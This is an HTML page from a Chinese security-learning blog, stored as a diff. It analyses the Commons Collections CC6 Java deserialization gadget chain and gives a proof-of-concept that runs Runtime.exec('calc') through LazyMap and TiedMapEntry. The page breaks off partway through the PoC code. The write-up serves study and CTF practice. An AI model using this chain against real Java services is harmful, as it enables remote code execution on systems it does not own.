@@ -1,0 +1,494 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="高版本的CC链利用解决方案:CC6 在Java 8u71版本以后，CC1的两条利⽤链就不能再被利⽤了，主要原因是内置类方法 sun.reflect.annotation.AnnotationInvocationHandler#readObject 的逻辑变化了，无法调用到给定的map的方法而是自己创建了一个linkedxxxMapCC6则是一条可以在高版本利用的一条反序列化链子: 利⽤链可以在Ja">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Java安全5(5)_CC6">
+<meta property="og:url" content="https://kc1zs4.github.io/2024/11/17/Java%E5%AE%89%E5%85%A85(5)_CC6/index.html">
+<meta property="og:site_name" content="KC1zs4&#39;s Blog">
+<meta property="og:description" content="高版本的CC链利用解决方案:CC6 在Java 8u71版本以后，CC1的两条利⽤链就不能再被利⽤了，主要原因是内置类方法 sun.reflect.annotation.AnnotationInvocationHandler#readObject 的逻辑变化了，无法调用到给定的map的方法而是自己创建了一个linkedxxxMapCC6则是一条可以在高版本利用的一条反序列化链子: 利⽤链可以在Ja">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://kc1zs4.github.io/pic/Java%E5%AE%89%E5%85%A85(5)_CC6/MapEntry.png">
+<meta property="article:published_time" content="2024-11-17T15:29:21.307Z">
+<meta property="article:modified_time" content="2024-11-18T14:47:42.272Z">
+<meta property="article:tag" content="Java安全">
+<meta property="article:tag" content="java反序列化">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://kc1zs4.github.io/pic/Java%E5%AE%89%E5%85%A85(5)_CC6/MapEntry.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Java安全5(5)_CC6</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2024/11/18/Java%E5%AE%89%E5%85%A83(2)_%E5%B8%B8%E7%94%A8%E5%8A%A0%E8%BD%BD%E6%96%B9%E6%B3%95/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2024/11/17/Java%E5%AE%89%E5%85%A85(4)_CC1_LazyMap/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://kc1zs4.github.io/2024/11/17/Java%E5%AE%89%E5%85%A85(5)_CC6/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://kc1zs4.github.io/2024/11/17/Java%E5%AE%89%E5%85%A85(5)_CC6/&text=Java安全5(5)_CC6"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://kc1zs4.github.io/2024/11/17/Java%E5%AE%89%E5%85%A85(5)_CC6/&title=Java安全5(5)_CC6"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://kc1zs4.github.io/2024/11/17/Java%E5%AE%89%E5%85%A85(5)_CC6/&is_video=false&description=Java安全5(5)_CC6"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Java安全5(5)_CC6&body=Check out this article: https://kc1zs4.github.io/2024/11/17/Java%E5%AE%89%E5%85%A85(5)_CC6/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://kc1zs4.github.io/2024/11/17/Java%E5%AE%89%E5%85%A85(5)_CC6/&title=Java安全5(5)_CC6"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://kc1zs4.github.io/2024/11/17/Java%E5%AE%89%E5%85%A85(5)_CC6/&title=Java安全5(5)_CC6"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://kc1zs4.github.io/2024/11/17/Java%E5%AE%89%E5%85%A85(5)_CC6/&title=Java安全5(5)_CC6"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://kc1zs4.github.io/2024/11/17/Java%E5%AE%89%E5%85%A85(5)_CC6/&title=Java安全5(5)_CC6"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://kc1zs4.github.io/2024/11/17/Java%E5%AE%89%E5%85%A85(5)_CC6/&name=Java安全5(5)_CC6&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://kc1zs4.github.io/2024/11/17/Java%E5%AE%89%E5%85%A85(5)_CC6/&t=Java安全5(5)_CC6"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%AB%98%E7%89%88%E6%9C%AC%E7%9A%84CC%E9%93%BE%E5%88%A9%E7%94%A8%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88-CC6"><span class="toc-number">1.</span> <span class="toc-text">高版本的CC链利用解决方案:CC6</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CC6%E6%9E%84%E9%80%A0%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text">CC6构造分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Gadget-Chain"><span class="toc-number">2.1.</span> <span class="toc-text">Gadget Chain</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#org-apache-commons-collections-keyvalue-TiedMapEntry"><span class="toc-number">2.2.</span> <span class="toc-text">org.apache.commons.collections.keyvalue.TiedMapEntry</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFMap-Entry"><span class="toc-number">2.3.</span> <span class="toc-text">什么是Map.Entry?</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%88%91%E7%9A%84CC6"><span class="toc-number">2.4.</span> <span class="toc-text">我的CC6</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#CC6-poc-KC1zs4"><span class="toc-number">2.4.1.</span> <span class="toc-text">CC6 poc KC1zs4</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Q-%E4%B8%BA%E4%BB%80%E4%B9%88payload%E6%9C%80%E5%90%8E%E5%86%8D%E5%8A%A0%E5%85%A5"><span class="toc-number">2.4.2.</span> <span class="toc-text">Q: 为什么payload最后再加入?</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Q-%E4%B8%BA%E4%BB%80%E4%B9%88%E4%BC%9A%E5%9C%A8field-set-myLazyMap-payload-%E4%B9%9F%E8%B0%83%E7%94%A8%E4%B8%80%E6%AC%A1%EF%BC%9F%E6%80%BB%E5%85%B1%E8%B0%83%E7%94%A8%E4%B8%A4%E6%AC%A1%EF%BC%9F"><span class="toc-number">2.4.3.</span> <span class="toc-text">Q: 为什么会在field.set(myLazyMap,payload)也调用一次？总共调用两次？</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Q-%E4%B8%BA%E4%BB%80%E4%B9%88myLazyMap-remove-key1-%E5%90%A6%E5%88%99%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%97%A0%E6%B3%95%E8%B0%83%E7%94%A8%EF%BC%9F"><span class="toc-number">2.4.4.</span> <span class="toc-text">Q: 为什么myLazyMap.remove(&quot;key1&quot;);否则反序列化无法调用？</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9E%84%E9%80%A0poc%E7%9A%84%E4%B8%80%E4%BA%9B%E6%B3%A8%E6%84%8F%E7%82%B9"><span class="toc-number">2.4.5.</span> <span class="toc-text">构造poc的一些注意点</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CC6-poc-phith0n"><span class="toc-number">2.5.</span> <span class="toc-text">CC6 poc phith0n</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93%E4%B8%80%E4%B8%8B-%E4%BB%8ECC1-TransformedMap%E5%88%B0CC1-LazyMap%E5%86%8D%E5%88%B0CC6"><span class="toc-number">3.</span> <span class="toc-text">总结一下: 从CC1_TransformedMap到CC1_LazyMap再到CC6</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Ref"><span class="toc-number">4.</span> <span class="toc-text">Ref</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        Java安全5(5)_CC6
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name"></span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-11-17T15:29:21.307Z" class="dt-published" itemprop="datePublished">2024-11-17</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/CTF/">CTF</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/Java%E5%AE%89%E5%85%A8/" rel="tag">Java安全</a>, <a class="p-category" href="/tags/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">java反序列化</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="高版本的CC链利用解决方案-CC6"><a href="#高版本的CC链利用解决方案-CC6" class="headerlink" title="高版本的CC链利用解决方案:CC6"></a>高版本的CC链利用解决方案:CC6</h2><blockquote>
+<p>在Java 8u71版本以后，CC1的两条利⽤链就不能再被利⽤了，主要原因是内置类方法 <code>sun.reflect.annotation.AnnotationInvocationHandler#readObject</code> 的逻辑变化了，无法调用到给定的map的方法而是自己创建了一个linkedxxxMap<br>CC6则是一条可以在高版本利用的一条反序列化链子: 利⽤链可以在Java 7和8的⾼版本触发，没有版本限制</p>
+</blockquote>
+<h2 id="CC6构造分析"><a href="#CC6构造分析" class="headerlink" title="CC6构造分析"></a>CC6构造分析</h2><h3 id="Gadget-Chain"><a href="#Gadget-Chain" class="headerlink" title="Gadget Chain"></a>Gadget Chain</h3><blockquote>
+<p>CC6的构造也是基于LazyMap的，是在CC1基础上拓展出来的</p>
+</blockquote>
+<ol>
+<li>分析一下链子再跟着去看源码<ol>
+<li>看一下下面TiedMapEntry这一个类，结合调用链分析就容易理解了(注意基于CC1而来)</li>
+</ol>
+</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line"> java.io.ObjectInputStream.readObject()</span><br><span class="line">    java.util.HashMap.readObject()</span><br><span class="line">        java.util.HashMap.<span class="built_in">hash</span>()</span><br><span class="line">            org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()</span><br><span class="line">            org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()</span><br><span class="line">                org.apache.commons.collections.map.LazyMap.get()</span><br><span class="line">                    org.apache.commons.collections.functors.ChainedTransformeretransform()</span><br><span class="line">                        org.apacheecommons.collections.functors.InvokerTransformer.transform()</span><br><span class="line">                            java.lang.reflect.Method.invoke()</span><br><span class="line">                            java.lang.Runtime.<span class="built_in">exec</span>()</span><br></pre></td></tr></table></figure>
+
+<h3 id="org-apache-commons-collections-keyvalue-TiedMapEntry"><a href="#org-apache-commons-collections-keyvalue-TiedMapEntry" class="headerlink" title="org.apache.commons.collections.keyvalue.TiedMapEntry"></a>org.apache.commons.collections.keyvalue.TiedMapEntry</h3><ol>
+<li><p>审计一下，知道总体来说就是一个新的map实体而已，这里没什么特殊</p>
+ <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * A Map Entry tied to a map underneath.</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * This can be used to enable a map entry to make changes on the underlying</span></span><br><span class="line"><span class="comment"> * map, however this will probably mess up any iterators.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> Commons Collections 3.0</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@version</span> $Revision: 1.5 $ $Date: 2004/04/09 14:35:10 $</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Stephen Colebourne</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TiedMapEntry</span> <span class="keyword">implements</span> <span class="title class_">Map</span>.Entry, KeyValue, Serializable &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>重点看看hashCode()方法和getXXX()方法</p>
+<ol>
+<li>重点在于<code>getValue()</code>，因为这里会调用到<code>map.get(key)</code>，可以<strong>调用到LazyMap中的get到<code>transform()</code></strong></li>
+<li>又注意到<code>hashCode()</code>方法中会调用到<code>getValue()</code>方法，也是ok</li>
+</ol>
+ <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Gets the key of this entry</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> the key</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">getKey</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> key;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Gets the value of this entry direct from the map.</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> the value</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">getValue</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> map.get(key);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Gets a hashCode compatible with the equals method.</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * Implemented per API documentation of &#123;<span class="doctag">@link</span> java.util.Map.Entry#hashCode()&#125;</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> a suitable hash code</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> getValue();</span><br><span class="line">    <span class="keyword">return</span> (getKey() == <span class="literal">null</span> ? <span class="number">0</span> : getKey().hashCode()) ^</span><br><span class="line">           (value == <span class="literal">null</span> ? <span class="number">0</span> : value.hashCode()); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h3 id="什么是Map-Entry"><a href="#什么是Map-Entry" class="headerlink" title="什么是Map.Entry?"></a>什么是Map.Entry?</h3><ol>
+<li>Map.Entry与Map的关系<ol>
+<li>Map.Entry 接口表示 Map 中的一个条目，即一个键值对。它是 Map 接口中定义的一个静态内部接口。通过 Map.entrySet() 方法可以获取到一个包含所有条目的集合视图，该集合中的每个元素都是一个 Map.Entry 实例</li>
+<li>再idea的debug视图中可以看到<ol>
+<li><img src="/pic/Java%E5%AE%89%E5%85%A85(5)_CC6/MapEntry.png" alt="debug"></li>
+</ol>
+</li>
+</ol>
+</li>
+<li><em><strong>Map.Entry和Map是连接在一起的，但是Map.Entry中的key可以单独存在</strong></em></li>
+</ol>
+<h3 id="我的CC6"><a href="#我的CC6" class="headerlink" title="我的CC6"></a>我的CC6</h3><h4 id="CC6-poc-KC1zs4"><a href="#CC6-poc-KC1zs4" class="headerlink" title="CC6 poc KC1zs4"></a>CC6 poc KC1zs4</h4><ol>
+<li><p>这里先自己从利用链推一下</p>
+<ol>
+<li><p>那就要调用到tme对象的hashCode()方法，想起老朋友HashMap()(readObject()也是可以的)，再回去看</p>
+</li>
+<li><p>嗯可以，看继承关系hashCode()方法是有各个map实现类处理的，HashMap有下面这段，只需要值或者value是一个tme对象就好</p>
+  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> (key==<span class="literal">null</span>   ? <span class="number">0</span> : key.hashCode()) ^</span><br><span class="line">           (value==<span class="literal">null</span> ? <span class="number">0</span> : value.hashCode());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
+</ol>
+</li>
+<li><p>总结一下要求</p>
+<ol>
+<li>要求1：将tme对象放到HashMap()中</li>
+<li>要求2：将tme对象的map变为lazyMap+payload</li>
+<li>补一下：对tme对象调用hash会进入内部hashCode在对最底层的map进行处理</li>
+</ol>
+</li>
+<li><p><em><strong>构造poc如下</strong></em></p>
+<ol>
+<li>接下来解读一下逻辑</li>
+</ol>
+<blockquote>
+<p>自己写后参考p牛版本<br>这里有一个小坑点见下Q，可以调试一下来解决&#x2F;逻辑判断一下<br>下面这段poc确实是需要readObject()才会进行触发的</p>
+</blockquote>
+</li>
+</ol>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> CC6;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC6</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        poc();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">poc</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* * * * * * 1. payload * * * * * */</span></span><br><span class="line">            <span class="comment">// 依照思路是要给lazymap的转换器的</span></span><br><span class="line">            Transformer[] transformers = &#123;</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>)),</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                    <span class="comment">// 到这里才调用了getRuntime()获取了对应的对象</span></span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">                    , <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="string">&quot;hello world&quot;</span>)</span><br><span class="line">            &#125;;</span><br><span class="line">            <span class="type">ChainedTransformer</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="comment">/* * * * * * 2. 构造lazyMap * * * * * */</span></span><br><span class="line">            <span class="comment">// 先不加transformer，后面反射再加，防止提前触发，这里是占位</span></span><br><span class="line">            <span class="type">Map</span> <span class="variable">myMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">            <span class="type">Map</span> <span class="variable">myLazyMap</span> <span class="operator">=</span> LazyMap.decorate(myMap,<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="string">&quot;placeholder&quot;</span>));</span><br><span class="line">            myLazyMap.put(<span class="string">&quot;key1&quot;</span>,<span class="string">&quot;value1&quot;</span>); <span class="comment">// 这里无事发生，不会调用转换器，transformedMap才会在put调用</span></span><br><span class="line">            <span class="type">TiedMapEntry</span> <span class="variable">triggerObj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(myLazyMap, <span class="string">&quot;key1&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="comment">/* * * * * * 3. 构造反序列化对象HashMap * * * * * */</span></span><br><span class="line">            <span class="type">Map</span> <span class="variable">deserMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">            deserMap.put(triggerObj,<span class="string">&quot;value1&quot;</span>);</span><br><span class="line">                <span class="comment">// 就是这里的put调用了key的hashCode()方法先进行了一次添加，添加到了最底层的myMap中</span></span><br><span class="line">                <span class="comment">// 调用了lazyMap中的transform方法</span></span><br><span class="line">                <span class="comment">// 这里还要注意需要放在key这里，因为lazyMap中transform是对key的</span></span><br><span class="line">            myLazyMap.remove(<span class="string">&quot;key1&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="comment">/* * * * * * 4. 反射加入payload * * * * * */</span></span><br><span class="line">            <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.commons.collections.map.LazyMap&quot;</span>);</span><br><span class="line">            <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">            field.setAccessible(<span 